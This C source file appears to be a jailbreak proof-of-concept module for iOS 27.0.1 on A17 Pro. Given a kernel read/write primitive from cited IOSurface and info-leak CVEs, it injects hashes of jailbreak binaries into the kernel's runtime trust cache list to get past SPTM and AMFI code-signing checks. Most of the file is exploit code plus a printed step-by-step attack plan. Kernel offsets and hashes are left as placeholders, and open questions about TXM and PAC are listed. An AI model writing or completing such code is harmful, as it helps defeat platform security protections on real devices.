/*
 * Trust Cache Injection via Data-Only Exploitation
 * Target: iOS 27.0.1 / A17 Pro (iPad Mini, iPad16,1)
 *
 * This module injects CDHashes into the kernel's trust cache without
 * modifying SPTM-protected pages. It works by manipulating the
 * trust_cache_runtime linked list in XNU_DEFAULT kernel memory.
 *
 * The trust cache on SPTM devices has two layers:
 *
 * 1. TXM-managed trust cache slabs (TXM_SLAB_TRUST_CACHE frames)
 *    - Protected by SPTM, cannot be modified with kernel R/W
 *    - Contains the actual CDHash entries for Apple-signed binaries
 *
 * 2. Runtime trust cache linked list (XNU_DEFAULT frames)
 *    - Managed by XNU kernel code, lives in regular kernel heap
 *    - Head pointer in kernel data segment
 *    - Each node: { next_ptr, uuid, version, num_entries, entries[] }
 *    - Used by Dopamine's rootless approach for dynamic trust injection
 *
 * By allocating a new trust_cache_module in kernel heap (which is
 * XNU_DEFAULT memory), filling it with our CDHashes, and linking it
 * into the runtime list, we bypass SPTM entirely.
 *
 * Prerequisites:
 *   - Kernel R/W primitive (from IOSurface race, CVE-2026-112477)
 *   - KASLR slide (from info leak or Brotli heap data)
 *   - Known kernel addresses for trust cache symbols
 *
 * Educational jailbreak research only. For use on devices you own.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>
#include <CommonCrypto/CommonDigest.h>

/*
 * Trust cache structures (from XNU osfmk/kern/trust_cache.h)
 *
 * These match the iOS 27 kernel format. The runtime trust cache
 * uses a linked list of trust_cache_module_t entries.
 */

#define TC_UUID_SIZE        16
#define TC_HASH_SIZE_SHA256 32
#define TC_HASH_SIZE_SHA1   20
#define CDHASH_LEN          20  /* truncated SHA-256, stored as 20 bytes */

/* Trust cache entry — one per CDHash */
typedef struct __attribute__((packed)) {
    uint8_t  cdhash[CDHASH_LEN];
    uint8_t  hash_type;     /* 1 = SHA-1, 2 = SHA-256 (truncated) */
    uint8_t  flags;         /* 0 for most entries */
} trust_cache_entry1_t;

/* Trust cache module header */
typedef struct __attribute__((packed)) {
    uint32_t version;       /* 1 for this format */
    uint8_t  uuid[TC_UUID_SIZE];
    uint32_t num_entries;
    trust_cache_entry1_t entries[];
} trust_cache_module1_t;

/* Runtime trust cache node (linked list) */
typedef struct trust_cache_node {
    uint64_t next;          /* kernel pointer to next node */
    uint64_t prev;          /* kernel pointer to prev node (doubly linked) */
    trust_cache_module1_t module;
} trust_cache_node_t;

/*
 * CDHashes of jailbreak binaries to inject.
 * These would be computed from the actual binary Mach-O files.
 * For this PoC, we use placeholder values.
 */
typedef struct {
    const char *name;
    uint8_t cdhash[CDHASH_LEN];
} jb_binary_t;

/* Placeholder CDHashes — replace with real values from binary analysis */
static jb_binary_t jb_binaries[] = {
    {"Sileo.app/Sileo",          {0}},
    {"ldid",                     {0}},
    {"dpkg",                     {0}},
    {"apt",                      {0}},
    {"jailbreakd",               {0}},
    {"amfid_payload.dylib",      {0}},
    {"procursus-bootstrap.tar",  {0}},
    {"launchctl",                {0}},
};
#define NUM_JB_BINARIES (sizeof(jb_binaries) / sizeof(jb_binaries[0]))

/*
 * Kernel R/W primitives (abstract interface)
 *
 * In a real exploit, these are provided by the IOSurface race
 * (CVE-2026-112477) or the pt_desc overflow UAF.
 */

typedef struct {
    /* Read 64-bit value from kernel virtual address */
    uint64_t (*kread64)(uint64_t kaddr);

    /* Write 64-bit value to kernel virtual address */
    void (*kwrite64)(uint64_t kaddr, uint64_t value);

    /* Read N bytes from kernel */
    void (*kread)(uint64_t kaddr, void *buf, size_t len);

    /* Write N bytes to kernel */
    void (*kwrite)(uint64_t kaddr, const void *buf, size_t len);

    /* Allocate N bytes in kernel heap (kalloc) */
    uint64_t (*kalloc)(size_t size);

    /* KASLR slide */
    uint64_t slide;

    /* Kernel base (slid) */
    uint64_t kernel_base;
} krw_t;

/*
 * Kernel symbol offsets (from iOS 27.0.1 kernelcache, A17 Pro)
 * These need to be extracted from the actual kernelcache.
 *
 * Finding these:
 * 1. Extract kernelcache: pymobiledevice3 or img4lib
 * 2. Load in IDA/Ghidra with arm64e support
 * 3. Search for "trust_cache" strings
 * 4. Find trust_cache_runtime_init and trace the global pointer
 */
typedef struct {
    uint64_t trust_cache_rt;         /* trust_cache_runtime_t global */
    uint64_t pmap_image4_trust_caches; /* alternate trust cache list */
} kernel_offsets_t;

static kernel_offsets_t offsets = {
    .trust_cache_rt = 0,              /* MUST BE FILLED from kernelcache */
    .pmap_image4_trust_caches = 0,    /* MUST BE FILLED from kernelcache */
};

/*
 * Compute CDHash of a Mach-O binary.
 *
 * The CDHash is the SHA-256 of the CodeDirectory blob, truncated to
 * 20 bytes. For ad-hoc signed binaries (which jailbreak binaries
 * typically are), the CodeDirectory is embedded in the Mach-O.
 *
 * In production, we'd parse the Mach-O LC_CODE_SIGNATURE load command,
 * find the CodeDirectory, and hash it. For this PoC, we accept
 * pre-computed CDHashes.
 */
static int compute_cdhash(const char *binary_path, uint8_t out_cdhash[CDHASH_LEN]) {
    /*
     * Real implementation would:
     * 1. Open the Mach-O file
     * 2. Parse load commands to find LC_CODE_SIGNATURE
     * 3. Parse the SuperBlob to find CodeDirectory
     * 4. SHA-256 hash the CodeDirectory
     * 5. Truncate to 20 bytes
     *
     * For now, return a placeholder.
     */
    (void)binary_path;
    memset(out_cdhash, 0, CDHASH_LEN);
    return -1;  /* not implemented */
}

/*
 * Find the trust cache runtime list head in kernel memory.
 *
 * The trust_cache_runtime_t structure contains a linked list of
 * dynamically loaded trust caches. On iOS 27:
 *
 * struct trust_cache_runtime {
 *     lck_mtx_t lock;
 *     struct trust_cache_node *head;  // ← this is what we need
 *     uint32_t num_modules;
 *     ...
 * };
 *
 * The global instance is typically at a fixed offset from kernel base.
 */
static uint64_t find_trust_cache_head(krw_t *krw) {
    if (offsets.trust_cache_rt == 0) {
        printf("  [-] trust_cache_rt offset not set.\n");
        printf("  [-] Extract from kernelcache with:\n");
        printf("      jtool2 -S kernelcache | grep trust_cache\n");
        printf("      or search for xrefs to 'trust cache' strings\n");
        return 0;
    }

    uint64_t rt_addr = krw->kernel_base + offsets.trust_cache_rt;
    printf("  trust_cache_runtime at 0x%llx\n", rt_addr);

    /*
     * Read the head pointer. The offset within the structure depends
     * on the lock size. On arm64e iOS 27:
     * - lck_mtx_t is typically 16 bytes
     * - head pointer at offset +16
     */
    uint64_t head = krw->kread64(rt_addr + 16);
    printf("  trust_cache list head: 0x%llx\n", head);

    return head;
}

/*
 * Allocate and populate a trust cache node in kernel heap.
 *
 * The node goes in kalloc (XNU_DEFAULT frame type), which SPTM
 * allows kernel to read/write freely. We're not modifying any
 * SPTM-protected pages — just adding to a linked list in ordinary
 * kernel heap memory.
 */
static uint64_t create_trust_cache_node(krw_t *krw, uint64_t next_node) {
    printf("  Creating trust cache node with %lu entries...\n",
           NUM_JB_BINARIES);

    /* Calculate sizes */
    size_t module_size = sizeof(trust_cache_module1_t) +
                         NUM_JB_BINARIES * sizeof(trust_cache_entry1_t);
    size_t node_size = 16 + module_size;  /* next + prev + module */

    /* Allocate in kernel heap */
    uint64_t node_kaddr = krw->kalloc(node_size);
    if (node_kaddr == 0) {
        printf("  [-] kalloc(%zu) failed\n", node_size);
        return 0;
    }
    printf("  Node allocated at 0x%llx (%zu bytes)\n", node_kaddr, node_size);

    /* Build the node in userspace first */
    uint8_t *node_buf = calloc(1, node_size);
    if (!node_buf) {
        printf("  [-] malloc failed\n");
        return 0;
    }

    /* Set linked list pointers */
    uint64_t *next_ptr = (uint64_t *)node_buf;
    uint64_t *prev_ptr = (uint64_t *)(node_buf + 8);
    *next_ptr = next_node;
    *prev_ptr = 0;  /* will be set when linked */

    /* Fill module header */
    trust_cache_module1_t *mod = (trust_cache_module1_t *)(node_buf + 16);
    mod->version = 1;

    /* Generate a random UUID for our module */
    arc4random_buf(mod->uuid, TC_UUID_SIZE);

    mod->num_entries = (uint32_t)NUM_JB_BINARIES;

    /* Fill entries with CDHashes */
    for (uint32_t i = 0; i < NUM_JB_BINARIES; i++) {
        memcpy(mod->entries[i].cdhash, jb_binaries[i].cdhash, CDHASH_LEN);
        mod->entries[i].hash_type = 2;  /* SHA-256 (truncated to 20 bytes) */
        mod->entries[i].flags = 0;
    }

    /* Write the entire node to kernel memory */
    krw->kwrite(node_kaddr, node_buf, node_size);

    free(node_buf);
    printf("  Node written to kernel memory.\n");

    return node_kaddr;
}

/*
 * Link our trust cache node into the runtime list.
 *
 * We prepend our node at the head of the list:
 * 1. Read current head pointer
 * 2. Set our node.next = current head
 * 3. Set head = our node
 *
 * This is a simple linked list manipulation in kernel heap memory.
 * No SPTM-protected pages are touched.
 */
static int link_trust_cache(krw_t *krw, uint64_t node_kaddr) {
    printf("  Linking node into trust cache list...\n");

    uint64_t head = find_trust_cache_head(krw);
    if (head == 0) {
        printf("  [-] Could not find trust cache list head.\n");
        return -1;
    }

    /* Our node's next already points to old head (set in create_trust_cache_node) */

    /* Update the head pointer to point to our node */
    uint64_t rt_addr = krw->kernel_base + offsets.trust_cache_rt;
    krw->kwrite64(rt_addr + 16, node_kaddr);

    printf("  Trust cache head updated: 0x%llx → 0x%llx\n",
           head, node_kaddr);

    /* If the old head exists, update its prev pointer */
    if (head != 0) {
        krw->kwrite64(head + 8, node_kaddr);
        printf("  Old head prev updated to point back to us.\n");
    }

    /* Increment module count */
    uint32_t count_offset = 24;  /* after lock + head + prev */
    uint64_t count_addr = rt_addr + count_offset;
    /* Read as uint32, increment, write back */
    uint64_t count_val = krw->kread64(count_addr);
    uint32_t num_modules = (uint32_t)(count_val & 0xFFFFFFFF);
    num_modules++;
    krw->kwrite64(count_addr, (count_val & 0xFFFFFFFF00000000ULL) | num_modules);

    printf("  Module count updated: %u\n", num_modules);

    return 0;
}

/*
 * Verify trust cache injection by checking AMFI's response.
 *
 * After injection, AMFI should accept our CDHashes as trusted.
 * We can verify by:
 * 1. Attempting to execve() a binary with our CDHash
 * 2. Checking amfid's trust cache query path
 *
 * On success, the binary runs without code signing errors.
 */
static int verify_injection(krw_t *krw) {
    printf("  Verifying trust cache injection...\n");

    uint64_t head = find_trust_cache_head(krw);
    if (head == 0) {
        printf("  [-] Trust cache head is NULL after injection!\n");
        return -1;
    }

    /* Read back our node's num_entries to verify */
    uint64_t num_entries_addr = head + 16 + 20;  /* skip next+prev, version+uuid */
    uint64_t num_raw = krw->kread64(num_entries_addr);
    uint32_t num = (uint32_t)(num_raw & 0xFFFFFFFF);

    printf("  Head node has %u entries (expected %lu)\n",
           num, NUM_JB_BINARIES);

    if (num == NUM_JB_BINARIES) {
        printf("  Trust cache injection verified!\n");
        return 0;
    }

    printf("  [-] Entry count mismatch. Injection may have failed.\n");
    return -1;
}

/*
 * Full trust cache injection flow.
 *
 * Call this after achieving kernel R/W (from IOSurface race or
 * pt_desc overflow) and resolving KASLR.
 */
int inject_trust_cache(krw_t *krw) {
    printf("\n=== Trust Cache Injection (Data-Only, SPTM-Safe) ===\n\n");

    if (!krw || !krw->kread64 || !krw->kwrite64 || !krw->kwrite || !krw->kalloc) {
        printf("[-] Kernel R/W primitives not initialized.\n");
        return -1;
    }

    if (offsets.trust_cache_rt == 0) {
        printf("[-] Kernel offsets not resolved.\n");
        printf("[-] Need: trust_cache_runtime offset from kernelcache.\n");
        return -1;
    }

    /* Step 1: Find current trust cache list */
    uint64_t current_head = find_trust_cache_head(krw);
    printf("  Current trust cache head: 0x%llx\n\n", current_head);

    /* Step 2: Create our trust cache node */
    uint64_t node = create_trust_cache_node(krw, current_head);
    if (node == 0) {
        printf("[-] Failed to create trust cache node.\n");
        return -1;
    }
    printf("\n");

    /* Step 3: Link it into the list */
    int rc = link_trust_cache(krw, node);
    if (rc < 0) {
        printf("[-] Failed to link trust cache node.\n");
        return -1;
    }
    printf("\n");

    /* Step 4: Verify */
    rc = verify_injection(krw);
    if (rc < 0) {
        printf("[-] Trust cache verification failed.\n");
        return -1;
    }

    printf("\n[+] Trust cache injection complete.\n");
    printf("[+] Jailbreak binaries should now pass AMFI validation.\n");
    printf("[+] Next: deploy Procursus bootstrap to /var/jb/\n");

    return 0;
}

/*
 * Standalone test entry point.
 *
 * Without kernel R/W, this just prints the injection plan and
 * verifies the data structures are correctly sized.
 */
int main(void) {
    printf("=== Trust Cache Injection — Data-Only SPTM Bypass ===\n");
    printf("Target: iOS 27.0.1 / A17 Pro\n\n");

    printf("Trust cache entry size: %zu bytes\n", sizeof(trust_cache_entry1_t));
    printf("Module header size: %zu bytes\n", sizeof(trust_cache_module1_t));
    printf("Entries to inject: %lu\n", NUM_JB_BINARIES);
    printf("Total module size: %zu bytes\n",
           sizeof(trust_cache_module1_t) +
           NUM_JB_BINARIES * sizeof(trust_cache_entry1_t));
    printf("Node size (with list ptrs): %zu bytes\n",
           16 + sizeof(trust_cache_module1_t) +
           NUM_JB_BINARIES * sizeof(trust_cache_entry1_t));

    printf("\nBinaries to trust:\n");
    for (size_t i = 0; i < NUM_JB_BINARIES; i++) {
        printf("  %zu. %s", i + 1, jb_binaries[i].name);
        int all_zero = 1;
        for (int j = 0; j < CDHASH_LEN; j++) {
            if (jb_binaries[i].cdhash[j] != 0) {
                all_zero = 0;
                break;
            }
        }
        if (all_zero) {
            printf(" (CDHash: PLACEHOLDER — compute from binary)\n");
        } else {
            printf(" (CDHash: ");
            for (int j = 0; j < CDHASH_LEN; j++) {
                printf("%02x", jb_binaries[i].cdhash[j]);
            }
            printf(")\n");
        }
    }

    printf("\n--- Injection Strategy ---\n");
    printf("1. Achieve kernel R/W via IOSurface race (CVE-2026-112477)\n");
    printf("   OR via pt_desc refcount overflow physical UAF\n");
    printf("2. Defeat KASLR via info leak (CVE-2026-113910)\n");
    printf("   OR via Brotli stale heap pointer analysis\n");
    printf("3. Find trust_cache_runtime in kernel data segment\n");
    printf("4. kalloc a new trust_cache_node in kernel heap\n");
    printf("5. Fill with CDHashes of jailbreak binaries\n");
    printf("6. Link node at head of trust cache list\n");
    printf("7. AMFI now trusts our binaries → code execution\n\n");

    printf("--- Why This Avoids SPTM ---\n");
    printf("- trust_cache_node allocated in kalloc → XNU_DEFAULT frame\n");
    printf("- XNU_DEFAULT frames are freely R/W with kernel primitive\n");
    printf("- List head pointer is in kernel data segment → XNU_DEFAULT\n");
    printf("- We never touch TXM_SLAB_TRUST_CACHE frames\n");
    printf("- SPTM only protects page tables and TXM slabs\n");
    printf("- Linked list manipulation is data-only → no SPTM involvement\n\n");

    printf("--- Remaining Questions ---\n");
    printf("1. Does TXM validate the linked list structure on lookup?\n");
    printf("   If yes, our injected node would fail validation.\n");
    printf("   Dopamine's approach suggests it doesn't (works on iOS 18).\n");
    printf("2. Is the list head PAC-signed on iOS 27?\n");
    printf("   If yes, we need a PAC signing gadget or forging primitive.\n");
    printf("3. Does AMFI cross-check against TXM slabs?\n");
    printf("   If AMFI only checks the linked list, we're good.\n");
    printf("   If it also checks TXM, we need the pt_desc approach.\n\n");

    printf("NOTE: CDHashes are placeholders. Real values must be computed\n");
    printf("from the Mach-O binaries' CodeDirectory blobs using SHA-256\n");
    printf("truncated to 20 bytes.\n");

    return 0;
}
